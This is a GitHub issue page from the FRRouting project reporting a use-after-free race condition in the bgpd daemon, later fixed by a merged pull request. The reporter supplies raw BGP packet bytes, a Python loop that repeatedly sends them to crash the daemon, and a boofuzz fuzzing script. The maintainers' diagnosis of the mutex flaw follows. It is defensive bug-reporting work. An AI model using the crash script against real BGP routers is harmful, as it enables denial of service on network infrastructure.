
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFRRouting%2Ffrr%2Fissues%2F11698)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFRRouting%2Ffrr%2Fissues%2F11698)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=FRRouting%2Ffrr)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[FRRouting](/FRRouting)
/
**[frr](/FRRouting/frr)**
Public

* [Notifications](/login?return_to=%2FFRRouting%2Ffrr) You must be signed in to change notification settings
* [Fork
  1.3k](/login?return_to=%2FFRRouting%2Ffrr)
* [Star
   3.5k](/login?return_to=%2FFRRouting%2Ffrr)

* [Code](/FRRouting/frr)
* [Issues
  352](/FRRouting/frr/issues)
* [Pull requests
  216](/FRRouting/frr/pulls)
* [Discussions](/FRRouting/frr/discussions)
* [Actions](/FRRouting/frr/actions)
* [Projects
  1](/FRRouting/frr/projects)
* [Wiki](/FRRouting/frr/wiki)
* [Security](/FRRouting/frr/security)
* [Insights](/FRRouting/frr/pulse)

Additional navigation options

* [Code](/FRRouting/frr)
* [Issues](/FRRouting/frr/issues)
* [Pull requests](/FRRouting/frr/pulls)
* [Discussions](/FRRouting/frr/discussions)
* [Actions](/FRRouting/frr/actions)
* [Projects](/FRRouting/frr/projects)
* [Wiki](/FRRouting/frr/wiki)
* [Security](/FRRouting/frr/security)
* [Insights](/FRRouting/frr/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FFRRouting%2Ffrr%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FFRRouting%2Ffrr%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# bgpd: A use-after-free bug due to race conditions in 2 threads. #11698

Closed

2 tasks done

[spwpun](/spwpun) opened this issue
Jul 28, 2022
· 17 comments
 · Fixed by [#11926](https://github.com/FRRouting/frr/pull/11926)

Closed

2 tasks done

# [bgpd: A use-after-free bug due to race conditions in 2 threads.](#top) #11698

[spwpun](/spwpun) opened this issue
Jul 28, 2022
· 17 comments
 · Fixed by [#11926](https://github.com/FRRouting/frr/pull/11926)

Assignees
[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=40&v=4)](/ton31337)

Labels
[bgp](/FRRouting/frr/labels/bgp)
[triage](/FRRouting/frr/labels/triage)
Needs further investigation

## Comments

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

### **[spwpun](/spwpun)** commented [Jul 28, 2022](#issue-1320384819)

| ---   **Describe the bug**   * Did you check if this is a duplicate issue? * Did you test it on the latest FRRouting/frr master branch?   **To Reproduce**   1. git clone the frr git version with commit: [a9b4458](https://github.com/FRRouting/frr/commit/a9b4458f6107af926df2c7ba20d0fd873bf6e99e) 2. Compile it with `-fsanitize=address` flags. 3. Run bgpd with a simple bgpd.conf as follow: `/path/to/bgpd -f /path/to/bgpd.conf`  ``` ! -*- bgp -*- ! ! BGPd sample configuratin file ! !  hostname bgpd-S1 password en enable password en  interface lo ip address 127.0.0.1/32  router bgp 1  bgp router-id 172.17.0.3  address-family ipv4 unicast    network 172.17.0.0/24  exit-address-family  no bgp ebgp-requires-policy  no bgp network import-check  neighbor 172.17.0.1 remote-as 2  neighbor 172.17.0.1 ebgp-multihop  neighbor 172.17.0.1 next-hop-self  neighbor 172.17.0.1 timers 5 5  neighbor 172.17.0.1 extended-optional-parameters   log file /tmp/bgpd.log  !debug bgp as4 !debug bgp events !debug bgp filters !debug bgp fsm debug bgp keepalives debug bgp updates debug bgp neighbor-events  ! log stdout  ```  4. Write a loop to sequencely send the packets below until it crash:  ``` bgp_open = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00#\x01\x04\x00\x02\x00\x05\xac\x11\x00\x01\xff\xff\x00\x03\x00\x01\x00' bgp_keepalive = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x13\x04' bgp_notification = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x15\x04xv'  ```  [1658832888676-9bf5e7f1-cf0a-4f12-a7d4-3e5b8a605776](https://user-images.githubusercontent.com/32606457/181420953-417b8b38-9938-4b14-8e0e-b2cbb61bb404.png) Because of the race condition, this might not be always cause the bgpd crash. **Expected behavior**  The bgpd daemon program won't crash. **Screenshots**  The ASAN outputs: [1658832889200-80fa1c84-6221-4dfe-a018-81615ed683c5](https://user-images.githubusercontent.com/32606457/181421070-9187f8fc-8f62-4b48-8e2c-54447589ab0a.png) [1658832889742-7a6e3765-7895-400f-ba58-97ecaf848313](https://user-images.githubusercontent.com/32606457/181421086-8ee13b45-5004-44d7-b8c1-15fd9882eac1.png) [1658832890273-24f0db12-1057-4e85-bd03-8c70b9a5316d](https://user-images.githubusercontent.com/32606457/181421099-ee3fd4eb-ac19-42df-bf67-45986d94d3ac.png)  **Versions**   * OS Version: Ubuntu 20.04  * Kernel: `Linux 1738de574178 5.15.0-41-generic #44~20.04.1-Ubuntu`  * FRR Version: git version with commit: [a9b4458](https://github.com/FRRouting/frr/commit/a9b4458f6107af926df2c7ba20d0fd873bf6e99e).   **Additional context** |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=40&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)
[spwpun](/spwpun)
added
the
[triage](/FRRouting/frr/labels/triage)
Needs further investigation
label
[Jul 28, 2022](#event-7078076845)

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=40&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)
[ton31337](/ton31337)
added
the
[bgp](/FRRouting/frr/labels/bgp)
label
[Jul 28, 2022](#event-7078320343)

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=80&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)

Copy link

Member

### **[ton31337](/ton31337)** commented [Jul 28, 2022](#issuecomment-1197693246)

| Is this the exact configuration snippet that crashes? `extended-optional-parameters` MUST exist or not? |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 28, 2022](#issuecomment-1197703648)

| Is this the exact configuration snippet that crashes? `extended-optional-parameters` MUST exist or not?  `extended-optional-parameters` configuration is not required. |
| --- |

All reactions

Sorry, something went wrong.

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=40&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)
[ton31337](/ton31337)
self-assigned this
[Jul 28, 2022](#event-7078409568)

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=80&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)

Copy link

Member

### **[ton31337](/ton31337)** commented [Jul 28, 2022](#issuecomment-1197779537)

| [@spwpun](https://github.com/spwpun) can you provide a script or something to easily run and replicate the crash? I have a potential fix, but I want to verify. |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 28, 2022](#issuecomment-1197787425)

| [@spwpun](https://github.com/spwpun) can you provide a script or something to easily run and replicate the crash? I have a potential fix, but I want to verify.  Sure，but my script may not be 100% successful. The crash was encountered in the process of fuzzing it with boofuzz. The boofuzz script may be more complicated.  ``` import socket from time import sleep  bgp_open = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00#\x01\x04\x00\x02\x00\x05\xac\x11\x00\x01\xff\xff\x00\x03\x00\x01\x00' bgp_keepalive = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x13\x04' bgp_notification = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x15\x04xv'  while True:     try:         print("[+] Creating socket...")         s = socket.socket(type=socket.SOCK_STREAM)         print("[+] Connecting to server...")         s.connect(('172.17.0.3', 179))         s.send(bgp_open)         sleep(0.0009999999)         s.send(bgp_keepalive)         s.send(bgp_notification)     except KeyboardInterrupt:         s.close()         break     except:         s.close() ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=80&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)

Copy link

Member

### **[ton31337](/ton31337)** commented [Jul 28, 2022](#issuecomment-1197817754)

| Do you have a script for boofuzz? |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 28, 2022](#issuecomment-1197830510)

| Do you have a script for boofuzz? yeah， use it with boofuzz latest version.  ``` from boofuzz import constants from boofuzz import * from boofuzz import helpers  # bgp open s_initialize("bgp_open") if s_block_start("BGP"):     if s_block_start("Header"):         s_bytes(value=b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", padding=b"\xFF", size=16, name="Marker", fuzzable=False)         # The length should be calculated automatically:          # len is the open message length, 19 is the length of the header         s_size(block_name="Open", length=2, math=lambda x: x + 19, name="Length", endian=BIG_ENDIAN, fuzzable=False) # keep right length         # s_word(value=34, fuzz_values=[0, 1, 2, 3, 4, 5, 16, 8, 20, 24, 32, 33], endian=BIG_ENDIAN, name="Length", fuzzable=True) # original field         # Type is always 1 for open messages         s_byte(value=0x01, endian=BIG_ENDIAN, name="Type", fuzzable=False)     s_block_end()          if s_block_start("Open"):         s_byte(value=0x04, endian=BIG_ENDIAN, name="Version", fuzzable=False)         s_word(value=2, endian=BIG_ENDIAN, name="My Autonomous System", fuzzable=False)         s_word(value=5, endian=BIG_ENDIAN, name="Hold Time", fuzzable=False)         # BGP Identifier is IP address         s_dword(value=helpers.ip_str_to_bytes("172.17.0.1"), endian=BIG_ENDIAN, name="BGP Identifier", fuzzable=False)         s_byte(value=b"\xff", endian=">", name="Non-Ext OP Len", fuzzable=False)         # s_byte(value=0x00, endian=BIG_ENDIAN, name="Optional Parameter Length", fuzzable=True) # original field         # s_string(value="", name="Optiname Parameters", size=-1, padding=b'\x00', fuzzable=True)         s_byte(value=b'\xff', endian=">", name = "Non-Ext OP Type", fuzzable=False)         s_size(block_name="Optional Parameters", length=2, name="Extended Opt. Parm Length", endian=BIG_ENDIAN, fuzzable=False)         # s_word(value=4096, endian=">", name = "Extended Opt. Parm Length", fuzzable = True) # original field          if s_block_start("Optional Parameters"):             # Optional Parameters [0]:             if s_block_start("Reserved"):                 s_byte(value=0x00, endian=BIG_ENDIAN, name="Parameter Type", fuzzable=False)                 s_size(block_name="Reserved Parameter Value", length=1, name="Parameter Length", endian=BIG_ENDIAN, fuzzable=False)                 # s_byte(value=0x00, endian=BIG_ENDIAN, name="Parameter Length", fuzzable=True) # original field                 s_string(value="\x00", name="Reserved Parameter Value", size=-1, padding=b'\x00', fuzzable=False, max_len=1500)             s_block_end()         s_block_end()     s_block_end() s_block_end()  # bgp keepalive s_initialize("bgp_keepalive") if s_block_start("BGP"):     if s_block_start("Header"):         s_bytes(value=b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", padding=b"\xFF", size=16, name="Marker", fuzzable=False)         # The length should be calculated automatically:          # len is the open message length, 19 is the length of the header         s_size(block_name="Keepalive", length=2, math=lambda x: x + 19, name="Length", endian=BIG_ENDIAN, fuzzable=False)         # s_word(value=19, fuzz_values=[0, 1, 2, 3, 4, 5, 16, 8, 20, 24, 32, 33], endian=BIG_ENDIAN, name="Length", fuzzable=True) # original field         # Type is always 4 for keepalive messages         s_byte(value=0x04, endian=BIG_ENDIAN, name="Type", fuzzable=False)     s_block_end()      # A KEEPALIVE message consists of only the message header and has a length of 19 octets.     if s_block_start("Keepalive"):         pass     s_block_end() s_block_end()  # bgp notification s_initialize("bgp_notification") if s_block_start("BGP"):     if s_block_start("Header"):         s_bytes(value=b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", padding=b"\xFF", size=16, name="Marker", fuzzable=False)         # The length should be calculated automatically:          # len is the open message length, 19 is the length of the header         s_size(block_name="Notification", length=2, math=lambda x: x + 19, name="Length", endian=BIG_ENDIAN, fuzzable=False)         # s_word(value=19, fuzz_values=[0, 1, 2, 3, 4, 5, 16, 8, 20, 24, 32, 33], endian=BIG_ENDIAN, name="Length", fuzzable=True) # original field         # Type is always 4 for keepalive messages         s_byte(value=0x04, endian=BIG_ENDIAN, name="Type", fuzzable=False)     s_block_end()      if s_block_start("Notification"):         s_byte(value=0x00, endian=BIG_ENDIAN, name="Error Code", fuzzable=True)         s_byte(value=0x00, endian=BIG_ENDIAN, name="Error Subcode", fuzzable=True)         s_string(value="", name="Error Message", size=-1, padding=b'\x00', fuzzable=True)     s_block_end() s_block_end()    TARGET_IP = "172.17.0.3" TARGET_PORT = 179  fuzz_sess = Session(     target=Target(         # TCPSocketConnection example         connection=TCPSocketConnection(             host=TARGET_IP,             port=TARGET_PORT,             send_timeout=5,             recv_timeout=5,             server=False,         ),     ),     # other extra settings     ignore_connection_reset=True,     receive_data_after_each_request=True,     receive_data_after_fuzz=True,  )  fuzz_sess.connect(s_get("bgp_open")) fuzz_sess.connect(s_get("bgp_open"),s_get("bgp_keepalive")) fuzz_sess.connect(s_get("bgp_keepalive"),s_get("bgp_notification")) fuzz_sess.fuzz() ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=80&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)

Copy link

Member

### **[ton31337](/ton31337)** commented [Jul 28, 2022](#issuecomment-1197841020)

| Thanks. |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 28, 2022](#issuecomment-1197846957)

| Thanks.  By the way, I just tested it again using this boofuzz script and bgpd crashes at about 4 minutes. In my opinion there is a 90% chance of success. |
| --- |

All reactions

Sorry, something went wrong.

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=80&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)

Copy link

Member

### **[ton31337](/ton31337)** commented [Jul 28, 2022](#issuecomment-1197882078)

| Can't replicate quickly in 30 minutes. Running with:  ``` # timeout -s 9 1800 python3 b.py  ```  Trying more... |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 28, 2022](#issuecomment-1197968192)

| Can't replicate quickly in 30 minutes. Running with:  ``` # timeout -s 9 1800 python3 b.py  ```  Trying more...  Have you added '-fsanitize=address' cflags for frr when compiling？I tested it again with your command, crashed in about 10 minutes |
| --- |

All reactions

Sorry, something went wrong.

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=80&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)

Copy link

Member

### **[ton31337](/ton31337)** commented [Jul 28, 2022](#issuecomment-1197970929)

| Yep, I compiled with `--enable-address-sanitizer` as usual. |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 28, 2022](#issuecomment-1197991887)

| Yep, I compiled with `--enable-address-sanitizer` as usual.  It's so strange, maybe out of my knowledge. Try more time or other platform? |
| --- |

All reactions

Sorry, something went wrong.

[![@mjstapp](https://avatars.githubusercontent.com/u/19345840?s=80&v=4)](/mjstapp)

Copy link

Contributor

### **[mjstapp](/mjstapp)** commented [Jul 28, 2022](#issuecomment-1198160693)

| just read through this, and it does look like this may be real (imo). the io pthread is careful to hold the io\_mutex while it tests and reads from peer->curr, but the main pthread in `bgp_process_packet()` only holds the mutex long enough to set the pointer, not while using it (or freeing it):  ``` 		frr_with_mutex(&peer->io_mtx) { 			peer->curr = stream_fifo_pop(peer->ibuf); 		}  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 28, 2022](#issuecomment-1198211339)

| Yep, I compiled with `--enable-address-sanitizer` as usual.  Maybe you could use gdb to debug it with the first script, add breakpoint at bgp\_packet.c:2886 and bgp\_packet.c:922. ：） |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 30, 2022](#issuecomment-1200081970)

| just read through this, and it does look like this may be real (imo). the io pthread is careful to hold the io\_mutex while it tests and reads from peer->curr, but the main pthread in `bgp_process_packet()` only holds the mutex long enough to set the pointer, not while using it (or freeing it):  ``` 		frr_with_mutex(&peer->io_mtx) { 			peer->curr = stream_fifo_pop(peer->ibuf); 		}  ```  Thanks for reply, I also think it's real, |
| --- |

All reactions

Sorry, something went wrong.

[![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=80&u=952035b7475c463ed15d2599642572da0997b8db&v=4)](/spwpun)

Copy link

Author

### **[spwpun](/spwpun)** commented [Jul 30, 2022](#issuecomment-1200082326) • edited Loading

| [@spwpun](https://github.com/spwpun) can you provide a script or something to easily run and replicate the crash? I have a potential fix, but I want to verify.  [@ton31337](https://github.com/ton31337) Hi，thanks for your patiently reply，now have you checked this issue or fixed it? If any question, feel free to ask, I'll try my best to answer. |
| --- |

All reactions

Sorry, something went wrong.

[![@mjstapp](https://avatars.githubusercontent.com/u/19345840?s=40&v=4)](/mjstapp)
[mjstapp](/mjstapp)
mentioned this issue
[Sep 9, 2022](#ref-pullrequest-1367718468)

[bgpd: avoid notify race between io and main pthreads
#11926](/FRRouting/frr/pull/11926)
 Merged

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=40&u=4b7912655b13ff0545e1302b049046ac87206b30&v=4)](/ton31337)
[ton31337](/ton31337)
closed this as [completed](/FRRouting/frr/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#11926](/FRRouting/frr/pull/11926)
[Sep 12, 2022](#event-7369183964)

[![@yusky2003](https://avatars.githubusercontent.com/u/78591569?s=80&v=4)](/yusky2003)

Copy link

### **[yusky2003](/yusky2003)** commented [Feb 15, 2023](#issuecomment-1430912602)

| [@spwpun](https://github.com/spwpun) 这个会导致信息泄露吗？有具体的POC吗？ |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FFRRouting%2Ffrr%2Fissues%2F11698)

Assignees

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=40&v=4)](/ton31337) [ton31337](/ton31337)

Labels

[bgp](/FRRouting/frr/labels/bgp)
[triage](/FRRouting/frr/labels/triage)
Needs further investigation

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [bgpd: avoid notify race between io and main pthreads](/FRRouting/frr/pull/11926)
 [mjstapp/frr](/mjstapp/frr)

4 participants

[![@ton31337](https://avatars.githubusercontent.com/u/3352707?s=52&v=4)](/ton31337) [![@mjstapp](https://avatars.githubusercontent.com/u/19345840?s=52&v=4)](/mjstapp) [![@spwpun](https://avatars.githubusercontent.com/u/32606457?s=52&v=4)](/spwpun) [![@yusky2003](https://avatars.githubusercontent.com/u/78591569?s=52&v=4)](/yusky2003)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

